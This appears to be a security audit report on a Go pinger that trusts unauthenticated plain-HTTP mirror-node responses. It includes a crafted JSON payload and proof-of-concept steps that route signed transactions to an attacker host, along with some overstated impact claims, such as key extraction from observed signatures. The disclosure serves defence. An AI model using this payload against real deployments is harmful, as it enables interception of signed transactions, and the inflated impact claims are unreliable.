### Title
Unauthenticated Mirror-Node Response Accepted Without Node-Account-ID Validation, Enabling Network-Map Poisoning

### Summary
`fetchMirrorNodeNetwork` in `pinger/mirror_node_client.go` fetches consensus-node topology over a plain HTTP connection (no TLS enforcement, no certificate pinning) and accepts any `node_account_id` that is non-empty and parseable by `hiero.AccountIDFromString()`, including `0.0.0`. An attacker who can intercept or spoof the mirror-node HTTP response can inject arbitrary node entries — including attacker-controlled endpoints mapped to `0.0.0` or any other syntactically valid account ID — causing `hiero.ClientForNetwork(netmap)` to build a network map that routes signed transactions to attacker-controlled gRPC servers.

### Finding Description

**Code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–124.

```
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil { ... }   // line 96

for _, n := range payload.Nodes {
    if n.NodeAccountID == "" { continue }                                    // line 103 — only empty-string guard

    nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
    if err != nil { continue }                                               // line 107-109 — only parse guard

    for _, ep := range n.ServiceEndpoints {
        ...
        network[addr] = nodeAccountId                                        // line 123 — injected entry accepted
    }
}
```

**Root cause — two failed assumptions:**

1. *The transport is trusted.* The HTTP client is created as `&http.Client{Timeout: cfg.mirrorNodeClientTimeout}` with no TLS configuration and no enforcement that `cfg.mirrorRest` uses HTTPS. The documented default example in `config.go` line 37 is `http://mirror-rest:5551` — plain HTTP. Any on-path attacker can read and rewrite the response body.

2. *`AccountIDFromString` is a semantic validator.* It is only a syntax parser. `hiero.AccountIDFromString("0.0.0")` returns `AccountID{Shard:0, Realm:0, Account:0}` without error. There is no check that the parsed account ID belongs to the set of legitimate consensus-node accounts (e.g., `0.0.3`–`0.0.28` on mainnet).

**Exploit flow:**

A MITM attacker intercepts the HTTP GET to `/api/v1/network/nodes` and returns a crafted JSON body:

```json
{
  "nodes": [
    {
      "node_account_id": "0.0.0",
      "service_endpoints": [
        { "ip_address_v4": "attacker.example.com", "port": 50211 }
      ]
    }
  ],
  "links": {}
}
```

- `"0.0.0"` passes the empty-string check (line 103) and `AccountIDFromString` (line 107).
- `"attacker.example.com:50211"` passes the host/port checks (lines 114–119).
- `network["attacker.example.com:50211"] = AccountID{0,0,0}` is inserted.
- `hiero.ClientForNetwork(netmap)` builds a client whose only known node is the attacker's server.
- Every subsequent `submitWithRetry` call sends a fully signed, operator-keyed transaction to the attacker's gRPC endpoint.

### Impact Explanation

- **Transaction interception / replay**: The attacker receives signed, operator-keyed `CryptoTransfer` transactions. They can replay them against the real network (if not already submitted), extract the operator's signing key material from repeated observations, or simply drop them to cause a denial-of-service.
- **Operator key exposure**: Repeated signed transactions to an attacker-controlled node allow offline analysis of the operator's private key usage patterns and, in the worst case, key extraction if the SDK leaks key material in gRPC metadata.
- **Silent fund loss**: Transactions appear to succeed from the pinger's perspective (the attacker's server can return a synthetic OK), while no real transfer occurs, silently breaking the liveness signal the pinger is designed to provide.

Severity: **High** — the operator private key (`cfg.operatorKey`) signs every transaction; compromise of the network map directly exposes those signed payloads to an adversary.

### Likelihood Explanation

- The default mirror-node URL example is `http://` (plain HTTP), making passive MITM trivial for any on-path network actor (same L2 segment, rogue DNS, ARP spoofing in a shared cloud VPC, or a compromised sidecar container in the same Kubernetes pod network).
- DNS poisoning of the internal service name `mirror-rest` requires no special privilege in many container orchestration environments where DNS is not authenticated.
- The attack is repeatable: `newClient` is called once at startup, so a single poisoned response permanently corrupts the client for the lifetime of the process.
- No authentication (e.g., HMAC, mTLS, API key) is required to exploit this; the attacker only needs to be on-path for one HTTP response.

### Recommendation

1. **Enforce HTTPS with certificate verification**: Reject any `cfg.mirrorRest` URL that does not use the `https` scheme. Configure the HTTP client with a strict TLS policy.
2. **Validate node account IDs against a known-good set or minimum threshold**: After parsing, reject any `AccountID` with `Account == 0` (i.e., `0.0.0`) and optionally enforce that the shard/realm match the expected network values.
3. **Require a non-empty network map with a minimum node count**: A single-entry map (especially after injection) should be treated as suspicious and cause startup to fail.
4. **Pin the mirror-node TLS certificate or use mTLS** for the internal service connection to prevent substitution attacks even within the cluster network.

### Proof of Concept

**Preconditions**: Attacker has on-path access to the HTTP connection between the pinger and the mirror-node REST service (e.g., same Kubernetes namespace, DNS poisoning, or ARP spoofing). `HIERO_MIRROR_PINGER_NETWORK=other`, `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551`.

**Steps**:

1. Stand up a rogue gRPC server on `attacker:50211` that logs all incoming RPCs and returns `OK`.
2. Intercept the HTTP GET to `http://mirror-rest:5551/api/v1/network/nodes` and replace the response body with:
   ```json
   {"nodes":[{"node_account_id":"0.0.0","service_endpoints":[{"ip_address_v4":"<attacker-ip>","port":50211}]}],"links":{}}
   ```
3. Start the pinger. `fetchMirrorNodeNetwork` returns `map["<attacker-ip>:50211"] = AccountID{0,0,0}`.
4. `hiero.ClientForNetwork(netmap)` builds a client pointing exclusively at the attacker's server.
5. On the next ticker tick, `submitWithRetry` sends a signed `CryptoTransfer` transaction to `<attacker-ip>:50211`.
6. The attacker's server logs the full signed transaction bytes, including the operator account ID and signature.
